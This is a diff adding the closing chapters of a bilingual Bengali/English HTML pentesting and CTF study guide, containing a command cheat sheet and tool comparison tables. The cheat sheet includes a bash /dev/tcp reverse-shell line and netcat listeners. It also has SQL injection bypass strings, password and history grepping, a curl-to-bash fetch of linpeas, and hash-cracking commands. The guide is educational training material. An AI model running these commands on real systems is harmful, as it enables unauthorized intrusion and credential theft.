+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>🗺️ <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ <span class="bn-text">Phase 1 ছাড়া Phase 3-এ যাওয়া মানে ভিত্তি ছাড়া ঘর বানানো</span><span class="en-text">Going to Phase 3 without Phase 1 is like building a house without foundation</span></li>
+        <li>✅ <span class="bn-text">প্রতিদিন কমপক্ষে ১ ঘণ্টা হাতে-কলমে practice করো</span><span class="en-text">Practice hands-on at least 1 hour every day</span></li>
+        <li>✅ <span class="bn-text">শুধু পড়লে হবে না — terminal খোলো, কমান্ড চালাও</span><span class="en-text">Just reading won't work — open the terminal, run commands</span></li>
+        <li>✅ <span class="bn-text">Write-up পড়ো এবং নিজেই write-up লেখো</span><span class="en-text">Read write-ups and write your own</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 14: Quick Cheat Sheet
+════════════════════════════════════════ -->
+<div class="chapter ch3">
+  <div class="chapter-header" style="background:linear-gradient(135deg,#1b0000,#4a0000);">
+    <div class="chapter-label">CHAPTER 14</div>
+    <div class="chapter-title">📋 <span class="bn-text">Quick Cheat Sheet — দ্রুত রেফারেন্স</span><span class="en-text">Quick Cheat Sheet — Fast Reference</span></div>
+    <div class="chapter-desc"><span class="bn-text">সবচেয়ে বেশি ব্যবহৃত কমান্ড একনজরে</span><span class="en-text">Most frequently used commands at a glance</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <div class="box warn">
+      <div class="box-t">⚡ <span class="bn-text">এই Cheat Sheet কীভাবে ব্যবহার করবে?</span><span class="en-text">How to use this Cheat Sheet?</span></div>
+      <span class="bn-text">CTF বা Pentest-এর সময় দ্রুত কমান্ড খোঁজার জন্য এই section-টি bookmark করো।</span>
+      <span class="en-text">Bookmark this section to quickly find commands during a CTF or Pentest.</span>
+    </div>
+
+    <h2 class="sec">🔍 <span class="bn-text">Reconnaissance (তথ্য সংগ্রহ)</span><span class="en-text">Reconnaissance (Information Gathering)</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#0d1b2a;">🌐 Nmap</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">nmap -sV -sC -oN</span><span class="cheat-desc"><span class="bn-text">সার্ভিস + স্ক্রিপ্ট স্ক্যান</span><span class="en-text">Service + script scan</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nmap -p- --min-rate 5000</span><span class="cheat-desc"><span class="bn-text">সব পোর্ট দ্রুত স্ক্যান</span><span class="en-text">Fast full port scan</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nmap -sU -p 161</span><span class="cheat-desc"><span class="bn-text">UDP স্ক্যান (SNMP)</span><span class="en-text">UDP scan (SNMP)</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nmap --script vuln</span><span class="cheat-desc"><span class="bn-text">Vulnerability স্ক্যান</span><span class="en-text">Vulnerability scan</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nmap -sn 192.168.1.0/24</span><span class="cheat-desc"><span class="bn-text">Host discovery</span><span class="en-text">Host discovery</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#1b3a4b;">🕵️ OSINT</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">whois domain.com</span><span class="cheat-desc"><span class="bn-text">Domain মালিকের তথ্য</span><span class="en-text">Domain owner info</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">dig domain.com ANY</span><span class="cheat-desc"><span class="bn-text">সব DNS record</span><span class="en-text">All DNS records</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">subfinder -d domain.com</span><span class="cheat-desc"><span class="bn-text">Subdomain খোঁজা</span><span class="en-text">Subdomain discovery</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">theHarvester -d target.com</span><span class="cheat-desc"><span class="bn-text">Email ও subdomain</span><span class="en-text">Emails & subdomains</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">shodan search apache</span><span class="cheat-desc"><span class="bn-text">Internet device খোঁজা</span><span class="en-text">Internet device search</span></span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🐚 <span class="bn-text">Reverse Shell</span><span class="en-text">Reverse Shell</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#4a0000;">💻 <span class="bn-text">Listener (আমার মেশিনে)</span><span class="en-text">Listener (On My Machine)</span></div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">nc -lvnp 4444</span><span class="cheat-desc"><span class="bn-text">Netcat listener</span><span class="en-text">Netcat listener</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">rlwrap nc -lvnp 4444</span><span class="cheat-desc"><span class="bn-text">Arrow key সহ listener</span><span class="en-text">Listener with arrow keys</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#4a0000;">🎯 <span class="bn-text">Shell Payload (Target-এ)</span><span class="en-text">Shell Payload (On Target)</span></div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1</span><span class="cheat-desc">Bash</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">python3 -c 'import socket...'</span><span class="cheat-desc">Python</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">php -r '$s=fsockopen...'</span><span class="cheat-desc">PHP</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">msfvenom -p linux/x64/shell</span><span class="cheat-desc">MSF Payload</span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">⬆️ <span class="bn-text">Privilege Escalation Quick Check</span><span class="en-text">Privilege Escalation Quick Check</span></h2>
+    <div class="code">
+<span class="c"># ১. প্রথমেই চালাও</span>
+sudo -l                          <span class="c"># <span class="bn-text">কী কী sudo-তে চালাতে পারি?</span><span class="en-text">What can I run with sudo?</span></span>
+id && whoami                     <span class="c"># <span class="bn-text">আমি কে?</span><span class="en-text">Who am I?</span></span>
+cat /etc/passwd | grep -v nologin  <span class="c"># <span class="bn-text">login করতে পারে এমন user</span><span class="en-text">Users that can login</span></span>
+
+<span class="c"># ২. SUID বাইনারি</span>
+find / -perm -4000 -type f 2>/dev/null | head -20
+
+<span class="c"># ৩. Cron job</span>
+cat /etc/crontab && ls /etc/cron.*
+
+<span class="c"># ৪. Writable directory/file</span>
+find / -writable -type f 2>/dev/null | grep -v proc
+
+<span class="c"># ৫. Kernel version → exploit খোঁজা</span>
+uname -a
+searchsploit linux kernel $(uname -r)
+
+<span class="c"># ৬. Password file-এ plain text?</span>
+grep -r "password\|passwd" /var/www/ /home/ 2>/dev/null
+
+<span class="c"># ৭. History-তে কিছু আছে?</span>
+cat ~/.bash_history | grep -E "pass|ssh|mysql|ftp"
+
+<span class="c"># ৮. Automated tool</span>
+curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+    </div>
+
+    <h2 class="sec">🌐 <span class="bn-text">Web Attack Quick Ref</span><span class="en-text">Web Attack Quick Reference</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#0f3460;">🕷️ SQLi <span class="bn-text">পরীক্ষা</span><span class="en-text">Testing</span></div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">' OR '1'='1</span><span class="cheat-desc"><span class="bn-text">Basic auth bypass</span><span class="en-text">Basic auth bypass</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">' OR 1=1--</span><span class="cheat-desc"><span class="bn-text">Comment দিয়ে bypass</span><span class="en-text">Bypass with comment</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">admin'--</span><span class="cheat-desc"><span class="bn-text">Admin login bypass</span><span class="en-text">Admin login bypass</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">1 UNION SELECT 1,2,3--</span><span class="cheat-desc"><span class="bn-text">Column সংখ্যা বের করা</span><span class="en-text">Find column count</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">sqlmap -u URL --dbs</span><span class="cheat-desc"><span class="bn-text">Automated SQLi</span><span class="en-text">Automated SQLi</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#0f3460;">📁 Directory <span class="bn-text">ব্রুটফোর্স</span><span class="en-text">Bruteforce</span></div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">gobuster dir -u URL -w wordlist</span><span class="cheat-desc">Gobuster</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">ffuf -u URL/FUZZ -w list</span><span class="cheat-desc">FFUF</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">dirb URL /usr/share/dirb/wordlists/</span><span class="cheat-desc">Dirb</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nikto -h URL</span><span class="cheat-desc"><span class="bn-text">Web vulnerability scan</span><span class="en-text">Web vulnerability scan</span></span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🔑 <span class="bn-text">Password Cracking</span><span class="en-text">Password Cracking</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#2d1b69;">🔓 Hashcat</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">hashcat -m 0</span><span class="cheat-desc">MD5</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">hashcat -m 1000</span><span class="cheat-desc">NTLM (Windows)</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">hashcat -m 1800</span><span class="cheat-desc">SHA-512 (Linux)</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">hashcat -m 22000</span><span class="cheat-desc">WPA2 WiFi</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">hashcat -a 3 ?a?a?a?a</span><span class="cheat-desc"><span class="bn-text">Brute force mask</span><span class="en-text">Brute force mask</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#2d1b69;">🔑 John the Ripper</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">john hash.txt --wordlist=rockyou.txt</span><span class="cheat-desc"><span class="bn-text">Dictionary attack</span><span class="en-text">Dictionary attack</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">unshadow passwd shadow &gt; h.txt</span><span class="cheat-desc"><span class="bn-text">Linux hash বের করা</span><span class="en-text">Extract Linux hash</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">ssh2john id_rsa &gt; hash</span><span class="cheat-desc"><span class="bn-text">SSH key crack</span><span class="en-text">SSH key crack</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">zip2john file.zip &gt; hash</span><span class="cheat-desc"><span class="bn-text">ZIP password crack</span><span class="en-text">ZIP password crack</span></span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🐚 <span class="bn-text">Shell Upgrade — Interactive Shell</span><span class="en-text">Shell Upgrade — Interactive Shell</span></h2>
+    <div class="code">
+<span class="c"># Dumb shell পেলে এটা দিয়ে upgrade করো:</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="c"># তারপর:</span>
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+stty rows 50 cols 200
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📋 <span class="bn-text">Cheat Sheet সারসংক্ষেপ</span><span class="en-text">Cheat Sheet Summary</span></h3>
+      <ul>
+        <li>🔍 <span class="bn-text">Recon: nmap → gobuster → nikto</span><span class="en-text">Recon: nmap → gobuster → nikto</span></li>
+        <li>💥 <span class="bn-text">Exploit: searchsploit → metasploit → manual</span><span class="en-text">Exploit: searchsploit → metasploit → manual</span></li>
+        <li>⬆️ <span class="bn-text">PrivEsc: sudo -l → SUID → cron → kernel</span><span class="en-text">PrivEsc: sudo -l → SUID → cron → kernel</span></li>
+        <li>🔑 <span class="bn-text">Password: john → hashcat → hydra</span><span class="en-text">Password: john → hashcat → hydra</span></li>
+        <li>🐚 <span class="bn-text">Shell: nc listener → payload → upgrade</span><span class="en-text">Shell: nc listener → payload → upgrade</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 15: Tools Comparison Table
+════════════════════════════════════════ -->
+<div class="chapter ch2">
+  <div class="chapter-header" style="background:linear-gradient(135deg,#0d1a0d,#1a3a1a);">
+    <div class="chapter-label">CHAPTER 15</div>
+    <div class="chapter-title">🔧 <span class="bn-text">Tools Comparison — সেরা টুল বেছে নাও</span><span class="en-text">Tools Comparison — Choose the Best Tool</span></div>
+    <div class="chapter-desc"><span class="bn-text">কোন কাজে কোন টুল — পাশাপাশি তুলনা</span><span class="en-text">Which tool for which task — side by side comparison</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🌐 <span class="bn-text">Port Scanner তুলনা</span><span class="en-text">Port Scanner Comparison</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">গতি</span><span class="en-text">Speed</span></th>
+        <th><span class="bn-text">নির্ভুলতা</span><span class="en-text">Accuracy</span></th>
+        <th><span class="bn-text">বিশেষত্ব</span><span class="en-text">Specialty</span></th>
+        <th><span class="bn-text">কখন ব্যবহার করবে</span><span class="en-text">When to Use</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Nmap</strong></td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td>NSE Scripts, OS detection</td><td><span class="bn-text">সব সময় প্রথম পছন্দ</span><span class="en-text">Always first choice</span></td></tr>
+        <tr><td><strong>Masscan</strong></td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐</td><td><span class="bn-text">অতিদ্রুত</span><span class="en-text">Ultra fast</span></td><td><span class="bn-text">বড় নেটওয়ার্ক দ্রুত স্ক্যান</span><span class="en-text">Large network quick scan</span></td></tr>
+        <tr><td><strong>Rustscan</strong></td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐</td><td>Rust-based, fast</td><td><span class="bn-text">CTF-এ দ্রুত সব পোর্ট</span><span class="en-text">Quick all-port scan in CTF</span></td></tr>
+        <tr><td><strong>Netcat</strong></td><td>⭐⭐⭐</td><td>⭐⭐⭐</td><td>Banner grabbing</td><td><span class="bn-text">Manual port check</span><span class="en-text">Manual port check</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">💥 <span class="bn-text">Exploitation Framework তুলনা</span><span class="en-text">Exploitation Framework Comparison</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th>
+        <th><span class="bn-text">ভালো দিক</span><span class="en-text">Strengths</span></th>
+        <th><span class="bn-text">দুর্বল দিক</span><span class="en-text">Weaknesses</span></th>
+        <th><span class="bn-text">ব্যবহার</span><span class="en-text">Use Case</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Metasploit</strong></td><td>Framework</td><td><span class="bn-text">সব কিছু built-in, সহজ</span><span class="en-text">Everything built-in, easy</span></td><td><span class="bn-text">IDS detect করে সহজে</span><span class="en-text">Easily detected by IDS</span></td><td><span class="bn-text">CVE exploit, post-exploit</span><span class="en-text">CVE exploit, post-exploit</span></td></tr>
+        <tr><td><strong>SQLmap</strong></td><td>Web</td><td><span class="bn-text">Automated SQL injection</span><span class="en-text">Automated SQL injection</span></td><td><span class="bn-text">শুধু SQL injection</span><span class="en-text">SQL injection only</span></td><td><span class="bn-text">Web database attack</span><span class="en-text">Web database attack</span></td></tr>
+        <tr><td><strong>Burp Suite</strong></td><td>Web Proxy</td><td><span class="bn-text">সব web attack</span><span class="en-text">All web attacks</span></td><td><span class="bn-text">GUI, manual intervention</span><span class="en-text">GUI, manual intervention</span></td><td><span class="bn-text">Web app pentesting</span><span class="en-text">Web app pentesting</span></td></tr>
+        <tr><td><strong>BeEF</strong></td><td>Browser</td><td><span class="bn-text">Browser hooking</span><span class="en-text">Browser hooking</span></td><td><span class="bn-text">JS required</span><span class="en-text">JS required</span></td><td><span class="bn-text">XSS-এর পরে</span><span class="en-text">After XSS</span></td></tr>
+        <tr><td><strong>Exploit-DB / searchsploit</strong></td><td>Database</td><td><span class="bn-text">Offline exploit খোঁজা</span><span class="en-text">Offline exploit search</span></td><td><span class="bn-text">Manual execution</span><span class="en-text">Manual execution</span></td><td><span class="bn-text">CVE এর public exploit</span><span class="en-text">Public exploit for CVE</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🔑 <span class="bn-text">Password Attack Tools তুলনা</span><span class="en-text">Password Attack Tools Comparison</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th>
+        <th><span class="bn-text">GPU support</span><span class="en-text">GPU Support</span></th>
+        <th><span class="bn-text">কখন ব্যবহার</span><span class="en-text">When to Use</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Hydra</strong></td><td>Online BF</td><td>❌</td><td><span class="bn-text">Live service (SSH, FTP, HTTP)</span><span class="en-text">Live service (SSH, FTP, HTTP)</span></td></tr>
+        <tr><td><strong>Medusa</strong></td><td>Online BF</td><td>❌</td><td><span class="bn-text">Hydra-এর বিকল্প</span><span class="en-text">Alternative to Hydra</span></td></tr>
+        <tr><td><strong>John the Ripper</strong></td><td>Offline</td><td>⚠️ Limited</td><td><span class="bn-text">Linux shadow, ZIP, SSH key</span><span class="en-text">Linux shadow, ZIP, SSH key</span></td></tr>
+        <tr><td><strong>Hashcat</strong></td><td>Offline</td><td>✅ Best</td><td><span class="bn-text">GPU দিয়ে দ্রুত crack</span><span class="en-text">Fast crack with GPU</span></td></tr>
+        <tr><td><strong>CrackStation</strong></td><td>Online</td><td>N/A</td><td><span class="bn-text">Simple hash online lookup</span><span class="en-text">Simple hash online lookup</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">📡 <span class="bn-text">Network Analysis Tools</span><span class="en-text">Network Analysis Tools</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">ইন্টারফেস</span><span class="en-text">Interface</span></th>
+        <th><span class="bn-text">বিশেষত্ব</span><span class="en-text">Specialty</span></th>
+        <th><span class="bn-text">ব্যবহার</span><span class="en-text">Use Case</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Wireshark</strong></td><td>GUI</td><td><span class="bn-text">Packet analysis</span><span class="en-text">Packet analysis</span></td><td><span class="bn-text">Network traffic বিশ্লেষণ, CTF forensics</span><span class="en-text">Network traffic analysis, CTF forensics</span></td></tr>
+        <tr><td><strong>tcpdump</strong></td><td>CLI</td><td><span class="bn-text">দ্রুত capture</span><span class="en-text">Fast capture</span></td><td><span class="bn-text">Remote server-এ packet capture</span><span class="en-text">Packet capture on remote server</span></td></tr>
+        <tr><td><strong>Tshark</strong></td><td>CLI</td><td><span class="bn-text">Wireshark CLI version</span><span class="en-text">Wireshark CLI version</span></td><td><span class="bn-text">Script দিয়ে packet analysis</span><span class="en-text">Scripted packet analysis</span></td></tr>
+        <tr><td><strong>Netcat (nc)</strong></td><td>CLI</td><td><span class="bn-text">Multi-purpose</span><span class="en-text">Multi-purpose</span></td><td><span class="bn-text">Port scan, reverse shell, file transfer</span><span class="en-text">Port scan, reverse shell, file transfer</span></td></tr>
+        <tr><td><strong>ss / netstat</strong></td><td>CLI</td><td><span class="bn-text">Local socket info</span><span class="en-text">Local socket info</span></td><td><span class="bn-text">Open port ও connection দেখা</span><span class="en-text">View open ports & connections</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🛡️ <span class="bn-text">Blue Team vs Red Team Tools</span><span class="en-text">Blue Team vs Red Team Tools</span></h2>
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>🔴 Red Team (Attacker)</h4>
+        <table style="margin:0;">
+          <thead><tr><th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th></tr></thead>
+          <tbody>
+            <tr><td>Nmap</td><td><span class="bn-text">স্ক্যানিং</span><span class="en-text">Scanning</span></td></tr>
+            <tr><td>Metasploit</td><td><span class="bn-text">এক্সপ্লয়েট</span><span class="en-text">Exploiting</span></td></tr>
+            <tr><td>Burp Suite</td><td><span class="bn-text">ওয়েব অ্যাটাক</span><span class="en-text">Web attack</span></td></tr>
+            <tr><td>Hashcat</td><td><span class="bn-text">পাসওয়ার্ড ক্র্যাক</span><span class="en-text">Password crack</span></td></tr>
+            <tr><td>LinPEAS</td><td><span class="bn-text">PrivEsc খোঁজা</span><span class="en-text">Find PrivEsc</span></td></tr>
+            <tr><td>Mimikatz</td><td><span class="bn-text">Credential dump</span><span class="en-text">Credential dump</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="card success-card">
+        <h4>🔵 Blue Team (Defender)</h4>
+        <table style="margin:0;">
+          <thead><tr><th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th></tr></thead>
+          <tbody>
+            <tr><td>Snort / Suricata</td><td><span class="bn-text">IDS/IPS</span><span class="en-text">IDS/IPS</span></td></tr>
+            <tr><td>Fail2Ban</td><td><span class="bn-text">Brute force block</span><span class="en-text">Block brute force</span></td></tr>
+            <tr><td>Wazuh / OSSEC</td><td><span class="bn-text">SIEM / Log analysis</span><span class="en-text">SIEM / Log analysis</span></td></tr>
+            <tr><td>Wireshark</td><td><span class="bn-text">Traffic বিশ্লেষণ</span><span class="en-text">Traffic analysis</span></td></tr>
+            <tr><td>auditd</td><td><span class="bn-text">Audit logging</span><span class="en-text">Audit logging</span></td></tr>
+            <tr><td>Lynis</td><td><span class="bn-text">Security audit</span><span class="en-text">Security audit</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <h2 class="sec">📊 <span class="bn-text">কোন Distro কোন কাজে?</span><span class="en-text">Which Distro for Which Task?</span></h2>
+    <table>
+      <thead><tr>
+        <th>Distro</th>
+        <th><span class="bn-text">সেরা ব্যবহার</span><span class="en-text">Best Use</span></th>
+        <th><span class="bn-text">প্রি-ইনস্টলড টুল</span><span class="en-text">Pre-installed Tools</span></th>
+        <th><span class="bn-text">আমাদের রেটিং</span><span class="en-text">Our Rating</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Kali Linux</strong></td><td><span class="bn-text">Penetration Testing</span><span class="en-text">Penetration Testing</span></td><td>600+</td><td>⭐⭐⭐⭐⭐ <span class="badge badge-g"><span class="bn-text">সেরা পছন্দ</span><span class="en-text">Best choice</span></span></td></tr>
+        <tr><td><strong>Parrot OS</strong></td><td><span class="bn-text">Security + Privacy</span><span class="en-text">Security + Privacy</span></td><td>400+</td><td>⭐⭐⭐⭐ <span class="badge badge-b"><span class="bn-text">হালকা মেশিনে</span><span class="en-text">For light machines</span></span></td></tr>
+        <tr><td><strong>BlackArch</strong></td><td><span class="bn-text">Advanced Pentesting</span><span class="en-text">Advanced Pentesting</span></td><td>2800+</td><td>⭐⭐⭐⭐⭐ <span class="badge badge-r"><span class="bn-text">Expert-দের জন্য</span><span class="en-text">For experts</span></span></td></tr>
+        <tr><td><strong>REMnux</strong></td><td><span class="bn-text">Malware Analysis</span><span class="en-text">Malware Analysis</span></td><td>100+</td><td>⭐⭐⭐⭐⭐ <span class="badge badge-p"><span class="bn-text">Forensics</span><span class="en-text">Forensics</span></span></td></tr>
+        <tr><td><strong>TAILS</strong></td><td><span class="bn-text">Anonymity</span><span class="en-text">Anonymity</span></td><td>50+</td><td>⭐⭐⭐⭐ <span class="badge badge-y"><span class="bn-text">Privacy</span><span class="en-text">Privacy</span></span></td></tr>
+        <tr><td><strong>Ubuntu Server</strong></td><td><span class="bn-text">Blue Team Lab Setup</span><span class="en-text">Blue Team Lab Setup</span></td><td>0</td><td>⭐⭐⭐ <span class="badge badge-g"><span class="bn-text">Practice target</span><span class="en-text">Practice target</span></span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>🔧 <span class="bn-text">Tools Selection গাইড</span><span class="en-text">Tools Selection Guide</span></h3>
+      <ul>
+        <li>🔍 <span class="bn-text">Scanning → সবসময় Nmap দিয়ে শুরু</span><span class="en-text">Scanning → Always start with Nmap</span></li>
+        <li>💥 <span class="bn-text">Exploitation → Metasploit প্রথমে, তারপর manual</span><span class="en-text">Exploitation → Metasploit first, then manual</span></li>
+        <li>🔑 <span class="bn-text">Hash Crack → GPU থাকলে Hashcat, না থাকলে John</span><span class="en-text">Hash Crack → Use Hashcat with GPU, John without</span></li>
+        <li>🌐 <span class="bn-text">Web Testing → Burp Suite সবার আগে</span><span class="en-text">Web Testing → Burp Suite first</span></li>
+        <li>⬆️ <span class="bn-text">PrivEsc → LinPEAS চালাও, তারপর manual check</span><span class="en-text">PrivEsc → Run LinPEAS, then manual check</span></li>
+        <li>📡 <span class="bn-text">Traffic Analysis → Wireshark (GUI) বা tcpdump (CLI)</span><span class="en-text">Traffic Analysis → Wireshark (GUI) or tcpdump (CLI)</span></li>
+      </ul>
+    </div>
+
+    <div style="text-align:center; margin-top:50px; padding:30px; background:#0d1b2a; border-radius:12px; color:rgba(255,255,255,0.7);">
+      <p style="font-size:18px; color:#2dc653; margin-bottom:10px;">🐧 "In the world of Linux, the terminal is your superpower."</p>
+      <p><span class="bn-text">এই ডকুমেন্ট সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে। সব সময় authorized environment-এ প্র্যাকটিস করো।</span>
+         <span class="en-text">This document is entirely for educational purposes. Always practice in an authorized environment.</span></p>
+      <p style="margin-top:12px; font-size:12px; color:#2dc653;">v2.0 — Roadmap + Cheat Sheet + Tools Comparison + Bilingual + Dark Mode</p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ════ THEME TOGGLE ════
+const body = document.body;
+body.classList.add('light-mode');
+
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '☀️ Light Mode';
+    btn.style.background = '#ffd60a';
+    btn.style.color = '#0d1b2a';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '🌙 Dark Mode';
+    btn.style.background = '#2dc653';
+    btn.style.color = '#0d1b2a';
+    localStorage.setItem('theme', 'light');
+  }
+}
+
+// ════ LANGUAGE TOGGLE ════
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    btn.style.background = '#0077b6';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    btn.style.background = '#e63946';
+    localStorage.setItem('lang', 'en');
+  }
+}
+
+// ════ RESTORE SAVED PREFERENCES ════
+window.addEventListener('DOMContentLoaded', () => {
+  const savedTheme = localStorage.getItem('theme');
+  const savedLang = localStorage.getItem('lang');
+  if (savedTheme === 'dark') {
+    body.classList.replace('light-mode', 'dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) { btn.textContent = '☀️ Light Mode'; btn.style.background = '#ffd60a'; btn.style.color = '#0d1b2a'; }
+  }
+  if (savedLang === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) { btn.textContent = '🇧🇩 বাংলা'; btn.style.background = '#e63946'; }
+  }
+});
+</script>
+</body>
+</html>
